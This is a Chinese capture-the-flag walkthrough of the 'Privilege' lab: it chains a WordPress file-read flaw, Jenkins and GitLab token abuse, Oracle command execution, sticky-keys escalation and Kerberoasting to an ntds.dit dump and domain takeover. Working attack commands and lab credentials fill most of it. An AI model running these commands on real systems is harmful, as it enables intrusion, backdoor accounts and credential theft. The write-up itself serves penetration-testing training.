

# 内网打靶—春秋云镜篇 (4) - -Privilege - 先知社区

内网打靶—春秋云镜篇 (4) - -Privilege

- - -

靶场：春秋-Privilege

# 外网打点

## 信息搜集

fscan 扫描

[![](assets/1706233449-a2f3d4314069e9b0cdbdcfa416d70d28.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143143-3dc120d6-ba82-1.png)

发现 80 和 8080 端口存在着两个服务，先看下 80

[![](assets/1706233449-f9638c5770efb7960614e5c01296316a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143153-43acc90a-ba82-1.png)

Wordpress 建站，使用 wpscan 扫描一下

[![](assets/1706233449-b40df30fda62b71a9c600de4744ecd28.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143156-4504ecec-ba82-1.png)

相关插件漏洞寻找过后，发现并没有 RCE，所以换 8080 端口看看

[![](assets/1706233449-9e337bdf47bcbe71286cdb8ef2bec067.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143201-481ea562-ba82-1.png)

尝试弱口令未果，搜索相关 RCE 漏洞，探测未授权访问不存在

接下来再对 Wordpress 站使用 dirsearch 进行扫描

[![](assets/1706233449-01c1e3a9d30aa589f3de7af3dcd21d62.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143208-4c9d98be-ba82-1.png)

## 漏洞探测

发现源码文件，下载下来后发现有数据库账密

[![](assets/1706233449-43c3fcdafe0cef2628924c3e4452f324.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143216-5113d02a-ba82-1.png)

尝试连接，不过失败了，应该是不允许其他主机连接。

而后在`tools/content-log.php`下发现了存在任意文件读取漏洞。

[![](assets/1706233449-5a0d97eccdfc77c393fabb95c700d029.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143224-55bf10a8-ba82-1.png)

## 获取密码

根据题目描述我们获取到了 Jekins 根目录为`C:\ProgramData\Jenkins\.jenkins`，然后我们这里搜索过后可以发现初始密码路径

[![](assets/1706233449-d2b3877c3fcfb03d892776ba59cb4a15.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143239-5ee04ddc-ba82-1.png)

因此我们这里读取`C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword`即可

[![](assets/1706233449-190c5d0cd38e02ea19e45fe122879f84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143245-626e3ab8-ba82-1.png)

得到密码`510235cf43f14e83b88a9f144199655b`

既然是任意文件读取，也可以直接读 flag 了其实

[![](assets/1706233449-cba3e697c3012a094920ecc927e1193e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143252-667c3b64-ba82-1.png)

访问 8080 端口尝试登录

[![](assets/1706233449-c544d9cca6c1b0f49d10a221c8a756ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143257-695e3f76-ba82-1.png)

## 获取权限

发现命令行接口

[![](assets/1706233449-d6f8b038c6fdd82e668b9675180b3a7f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143325-7a0e6eb8-ba82-1.png)

之前在实战中有尝试过写 shell，然后去执行达到反弹 shell 的目的，因此这里也进行尝试，因为是 Windows 环境，没有 wget，所以用 curl -o。

[![](assets/1706233449-e6af9259ae6dae3fe30dc53fb4c5020b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143347-872f16a6-ba82-1.png)

不过这里发现并不能执行

[![](assets/1706233449-ba4410fca778d5f02cb21f664593026f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143355-8bea73b6-ba82-1.png)

没有 python 环境，所以只能作罢。

想起来 Windows 环境，当前用户还是 system 权限，可以直接添加管理员用户的，在这里添加管理员用户

```plain
net user qwq Qq123456. /add
net localgroup administrators qwq /add
```

[![](assets/1706233449-a61e93953f8756d01fcd791154420093.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143407-9324381a-ba82-1.png)

[![](assets/1706233449-1b4c5f7e9debcbdf15cc9521e00df6bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143415-9809895c-ba82-1.png)

而后 RDP 连接即可

[![](assets/1706233449-97c4000c7250fd2f000be19a2ecd8bc9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143422-9c1deeac-ba82-1.png)

# 内网横向

## 信息搜集

上线 VIPER 后使用 fscan 进行扫描

```plain
meterpreter > shell -c 'fscan64.exe -h 172.22.14.7/24'

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.14.7     is alive
(icmp) Target 172.22.14.11    is alive
(icmp) Target 172.22.14.16    is alive
(icmp) Target 172.22.14.31    is alive
(icmp) Target 172.22.14.46    is alive
[*] Icmp alive hosts len is: 5
172.22.14.46:445 open
172.22.14.31:445 open
172.22.14.11:445 open
172.22.14.7:445 open
172.22.14.46:139 open
172.22.14.31:139 open
172.22.14.11:139 open
172.22.14.7:139 open
172.22.14.46:135 open
172.22.14.31:135 open
172.22.14.11:135 open
172.22.14.7:135 open
172.22.14.46:80 open
172.22.14.16:80 open
172.22.14.7:80 open
172.22.14.16:22 open
172.22.14.7:8080 open
172.22.14.7:3306 open
172.22.14.31:1521 open
172.22.14.11:88 open
172.22.14.16:8060 open
172.22.14.16:9094 open
[*] alive ports len is: 22
start vulscan
[*] NetInfo:
[*]172.22.14.7
   [->]XR-JENKINS
   [->]172.22.14.7
[*] NetInfo:
[*]172.22.14.11
   [->]XR-DC
   [->]172.22.14.11
[*] NetInfo:
[*]172.22.14.46
   [->]XR-0923
   [->]172.22.14.46
[*] NetInfo:
[*]172.22.14.31
   [->]XR-ORACLE
   [->]172.22.14.31
[*] NetBios: 172.22.14.11    [+] DC:XIAORANG\XR-DC          
[*] NetBios: 172.22.14.31    WORKGROUP\XR-ORACLE           
[*] WebTitle: http://172.22.14.7:8080   code:403 len:548    title:None
[*] NetBios: 172.22.14.46    XIAORANG\XR-0923              
[*] WebTitle: http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
[*] WebTitle: http://172.22.14.46       code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.14.16       code:302 len:99     title:None 跳转 url: http://172.22.14.16/users/sign_in
[*] WebTitle: http://172.22.14.7        code:200 len:54603  title:XR SHOP
[*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
[+] http://172.22.14.7/www.zip poc-yaml-backup-file
```

## 代理搭建

[![](assets/1706233449-08a5feacfa2a48bcad09d80dd17463e8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143439-a6284be0-ba82-1.png)

## 攻击域成员一 (Gitlab API Token 泄露)

### 获取 API Token

而后根据题目描述，我们去寻找设置的 Gitlab API Token，在网页中可以找到

[![](assets/1706233449-7d9d50f39bd935fb33c475db419dc8e9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143447-ab2f1c7c-ba82-1.png)

得到`{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}`，但这明显是一个加密后的结果，我们需要对它进行解密，这里有两种方法

一是用网页的`project`接口的 gitlab 测试功能，将 url 改成我们的 VPS 监听端口，然后可以收到`PRIVATE-TOKEN`，这个后面的值就是真正的 API-TOKEN

[![](assets/1706233449-f8ac8e6bf2fde132c48c6b63ea6df1ed.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143455-b0306bae-ba82-1.png)

得到`glpat-7kD_qLH2PiQv_ywB9hz2`

二是我们可以使用命令行进行直接解密，具体指令如下

```plain
println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())
```

[![](assets/1706233449-ee7fa87731ef53edc3f68c596ad33434.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143502-b3e7ae10-ba82-1.png)

### 探测 git 仓库内容

在刚刚 fscan 扫描中我们可以看到

```plain
[*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
```

因此`172.22.14.16`这个就是 Gitlab 的部署站，仓库的通用接口是`api/v4/projects/`，这里带上刚刚的 token 访问就可以，指令如下

```plain
proxychains curl --silent --header "PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2"  "http://172.22.14.16/api/v4/projects/" | jq | grep "http_url_to_repo"
```

[![](assets/1706233449-1661a75ea63c9d0c456246360d7ec360.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143511-b940e674-ba82-1.png)

```plain
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git 
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git 
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git 
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git 
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git
```

接下来将内容拖下来

[![](assets/1706233449-52d6c3ff74cd7b51b58d5f20921f7f3f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143518-bd5b7fda-ba82-1.png)

发现一个存储大量用户名和密码的，可能待会需要爆破

[![](assets/1706233449-75052494c969e317a33e33599d8306c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143524-c1114092-ba82-1.png)

在`yml`文件中发现`Oracle`数据库账密

[![](assets/1706233449-89c9a29f390ee03073b316dc63544a9b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143532-c5edc662-ba82-1.png)

### Oracle 连接

尝试使用 mdut 连接

[![](assets/1706233449-a72ee5d69a8cd36b63f3b964fbb184fd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143540-ca7991b6-ba82-1.png)

但连接过后无法使用 (会报错)，试了试 Navicat 也长时间无响应。只能换其他工具了，使用`odat`进行连接，`odat`支持执行命令，我们这里直接添加用户

```plain
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user qwq Qq123456. /add'
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup Administrators qwq /add'
```

[![](assets/1706233449-592c7e705f628776904a9119cf36ed99.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143550-d078b9d4-ba82-1.png)

RDP 连接

[![](assets/1706233449-ba23e2116d329378a26ddf22f274d219.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143556-d4732790-ba82-1.png)

## 攻击域成员二 (SeRestorePrivilege 提权)

我们刚刚获取的大量用户名密码还没用，将数据提取出来

```plain
with open('credentials.txt', 'r') as file:
    lines = file.readlines()

usernames = [line.split('|')[1].strip() for line in lines[2:]]
passwords = [line.split('|')[2].strip() for line in lines[2:]]

with open('user.txt', 'w') as user_file:
    for username in usernames:
        user_file.write(username + '\n')

with open('pwd.txt', 'w') as pwd_file:
    for password in passwords:
        pwd_file.write(password + '\n')
```

使用 cme 进行爆破

[![](assets/1706233449-f2d4cdfd8c8607f71a8dbeaefeb8737f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143607-daa3b904-ba82-1.png)

不过慢慢发现 Fscan 中有这么一条

```plain
[*] NetBios: 172.22.14.46    XIAORANG\XR-0923
```

正好凭据也有一条

```plain
XR-0923 | zhangshuai | wSbEajHzZs
```

所以其实不用爆破，直接 RDP 就可以了

[![](assets/1706233449-81684d1896b23e34cedd9155c4c6223d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143750-186de69c-ba83-1.png)

### 信息搜集

查看当前所拥有权限

```plain
whoami /priv
```

[![](assets/1706233449-441de6924f2567fd5d34eb24c96ecd8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143758-1ccc2b04-ba83-1.png)

是`Remote Management Use`成员

可以参考[https://forum.butian.net/share/2080](https://forum.butian.net/share/2080)

使用`evil-winrm`连接此机器

```plain
proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs
```

[![](assets/1706233449-05b5b9b5dcbabda25f7d27ebe99dc172.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143803-203e0442-ba83-1.png)

可以发现再查看用户权限，发现多了一个`SeRestorePrivilege`

### SeRestorePrivilege 提权

参考[https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8)

可以了解到`SeRestorePrivilege`授予对系统上所有对象的写访问权，而不管它们的 ACL 如何。

此时我们就可以通过三种方式达到滥用特权的目的

```plain
1、修改服务二进制文件
2、覆盖系统进程使用的 DLL
3、修改注册表设置
```

这里尝试修改粘滞键为 cmd，但是拒绝访问了

[![](assets/1706233449-c8ae807ae010ebc0416a7f7134a51e23.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143811-24959000-ba83-1.png)

这里的话再尝试直接修改 cmd 名字为 sethc

```plain
ren sethc.exe  sethc.bak
ren cmd.exe sethc.exe
```

[![](assets/1706233449-d69a913a63600765a29765329b398c63.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143821-2a6c0de2-ba83-1.png)

而后锁定用户，在登录处 shift 5 次触发粘滞键

[![](assets/1706233449-e19b704872f7793551764bb24f1c603a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143829-2fac8cdc-ba83-1.png)

可以看到已经成功获取 system 权限，转发 VIPER 上线获取 flag

[![](assets/1706233449-caac7f5e61bcc05a93f197a87625d8d3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143836-3368bc7e-ba83-1.png)

## 攻击域控 (卷影拷贝提取 SAM)

首先添加个管理员用户，方便操作

[![](assets/1706233449-a5e4c1b88679d7d7de21f3d4ca5fa6da.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143850-3c3e7320-ba83-1.png)

接下来上传 Mimikatz，进行密码抓取

[![](assets/1706233449-3c250c385833eea63e4eff6c2f1f6666.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143857-3ffd4982-ba83-1.png)

呃，报错了，尝试在 VIPER 上使用 msf 模块进行票据搜集

[![](assets/1706233449-978d1f1d4802217c35044278ac2caf76.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143905-4515c642-ba83-1.png)

也不行，可能是版本问题，试了很多版本

最终在 2.2 的某个版本成功执行，是这个应该 (下载的太多了，不记得具体哪个了)

[https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz\_trunk.zip](https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip)

### 信息搜集

使用 Mimikatz 获取密码

[![](assets/1706233449-5f38b54b964293da96d933d8c303a2ca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143914-4a5c9a90-ba83-1.png)

发现一个机器账户

```plain
Authentication Id : 0 ; 832440 (00000000:000cb3b8)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/1/24 10:40:31
SID               : S-1-5-90-0-2
    msv :   
     [00000003] Primary
     * Username : XR-0923$
     * Domain   : XIAORANG
     * NTLM     : b2caa4c3f6d5e97bf7c58f7db9e24317
     * SHA1     : 00e3cf78689e875da3f43a5b62cc919990b52a6b
    tspkg : 
    wdigest :   
     * Username : XR-0923$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :  
     * Username : XR-0923$
     * Domain   : xiaorang.lab
     * Password : c8 9c 74 62 4b a5 13 60 f8 9f 61 ee 0c 9c b4 ca 97 d7 4c 53 6a 10 4e e7 74 03 51 0a 95 3f 78 af 15 22 5d 7f 0c 10 c9 96 19 7a bd 28 d7 c8 9a b7 ec 04 fb a9 18 83 30 e1 d9 75 aa ed c1 81 d0 76 c3 70 6c 68 35 e9 16 66 bd fe c7 92 78 59 be 9b 0b 65 91 10 8b 5b c4 8f 18 32 72 a6 cb bb c1 b0 96 0f 1d 63 bf 8f e8 4f 9b 7b 6a 7c 0a e8 2e 9a 40 d7 36 7d 2e 7a 0c 99 21 ca 64 27 b9 df 77 c6 f7 47 19 d7 bb 05 d6 4b ca e6 70 4b 62 5f 1c f8 78 b9 33 a2 f7 9e e5 77 78 db f9 cd b1 73 e9 b2 df 35 67 5e b0 12 85 ac 59 db 4c 53 8e 2d 6a d4 d3 93 f5 61 30 ee f5 53 d0 2a ae cf 50 83 92 31 ad 67 17 7a 21 58 dc 62 96 2f f2 1c 1e bc 05 1b 43 48 91 5d c1 06 1d 71 73 c0 fa 04 66 59 e9 35 04 a9 50 a5 79 70 06 7b ea 3a ea 0c 44 4c 01 63 
    ssp :   
    credman :   
    cloudap :
```

### Kerberoasting 攻击

```plain
proxychains GetUserSPNs.py xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11
```

[![](assets/1706233449-f3fef18a080a41058a68463789614c55.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143924-50284be0-ba83-1.png)

发现`tianjing`用户，抓取一下 hash

```plain
proxychains impacket-GetUserSPNs xiaorang.lab/'XR-0923$' -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip 172.22.14.11 -request-user tianjing
```

[![](assets/1706233449-3dbdf9f025987b6bf233a7fceeaed934.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143931-546db622-ba83-1.png)

而后破解一下密码

```plain
hashcat -m 13100 -a 0 1.txt /usr/share/wordlists/rockyou.txt --force
```

得到

```plain
tianjing:DPQSXSXgh2
```

使用`evil-winrm`登录，进行简单信息搜集

[![](assets/1706233449-f94544d3b1bacb07e1f369ceb0805573.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143939-58f76328-ba83-1.png)

### 卷影拷贝

有备份以及还原文件和目录的权限，尝试导出 sam 和 system。

首先在本地创建一个 dsh 文件，这里命名为`raj.dsh`，内容如下

```plain
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

接下来再用 unix2dos 将 dsh 文件的编码间距转换为 Windows 兼容的编码和间距

```plain
unix2dos raj.dsh
```

[![](assets/1706233449-29c775d6214b8d5a3b4d755c3a035a75.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143947-5dad3d48-ba83-1.png)

接下来上传到靶机，我们在`C:/`下随便创个目录，上传此文件

[![](assets/1706233449-efa67848e1194c0713492677a621eb41.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143952-61096692-ba83-1.png)

卷影拷贝

```plain
diskshadow /s raj.dsh
```

[![](assets/1706233449-256ea471fdc94596c5d8d3d8fb5f8755.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124143959-651a13c6-ba83-1.png)

复制到当前目录

```plain
RoboCopy /b z:\windows\ntds . ntds.dit
```

[![](assets/1706233449-21b5b934740607c29adf68c7dc53b644.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124144005-68baf950-ba83-1.png)

下载 sam 和 system

[![](assets/1706233449-3feaf16830c4279e963b3392424b7e2f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124144011-6c333a3e-ba83-1.png)

接下来进行解密

```plain
impacket-secretsdump -ntds ntds.dit -system system local
```

[![](assets/1706233449-643c7195c2ba13b2708bd8c4246ad862.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124144017-701904b2-ba83-1.png)

PTH 拿下域控

[![](assets/1706233449-c03e4ed3b1e3f441bd13c10fe8daa0fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240124144023-73808ee0-ba83-1.png)
